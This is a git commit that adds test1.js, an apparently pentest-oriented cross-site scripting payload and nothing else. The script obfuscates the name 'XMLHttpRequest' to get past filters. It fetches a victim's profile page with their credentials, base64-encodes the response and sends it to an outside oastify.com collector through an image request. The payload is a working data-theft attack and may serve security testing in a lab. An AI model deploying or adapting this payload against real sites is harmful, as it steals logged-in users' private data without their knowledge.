3e6c03ce124ed56e5c80bb7dcfd6a5a756e65745
hackerwahab <hackertabish786@gmail.com>
2026-02-21 07:11:53 +0500

    Create test1.js

---
+++ test1.js
@@ -0,0 +1,24 @@
+(() => {
+  try {
+    var url = "//lab1.demo-pentest.pp.ua/user/profile";
+    var name = ["XM", "LH", "tt", "pRe", "ques", "t"].join("");
+    var Ctor = window[name];
+    var req = new Ctor();
+    req.open("GET", url, true);
+    req.withCredentials = true;
+    req.onreadystatechange = () => {
+      if (req.readyState === 4 && req.status === 200) {
+        var text = req.responseText;
+        var b64 = btoa(unescape(encodeURIComponent(text)));
+        var exfil = "//85bvd284hy40crthekdavyvht8zznrif7.oastify.com/collect"
+          + "?source=" + encodeURIComponent(url)
+          + "&data=" + encodeURIComponent(b64);
+        var img = new Image();
+        img.src = exfil;
+      }
+    };
+    req.send(null);
+  } catch (e) {
+    console.log(e);
+  }
+})();
